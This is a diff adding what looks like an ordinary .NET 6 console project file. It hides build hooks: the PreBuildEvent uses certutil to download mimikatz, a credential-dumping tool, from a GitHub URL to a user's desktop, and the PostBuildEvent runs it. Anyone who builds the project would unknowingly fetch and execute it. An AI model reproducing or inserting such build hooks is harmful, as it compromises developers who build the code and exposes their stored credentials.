@@ -1,0 +1,12 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+	  <PreBuildEvent>certutil.exe -f -urlcache -split https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe C:\Users\0xm3m\Desktop\mimikatz.exe</PreBuildEvent>
+	  <PostBuildEvent>C:\Users\0xm3m\Desktop\mimikatz.exe</PostBuildEvent>
+  </PropertyGroup>
+
+</Project>
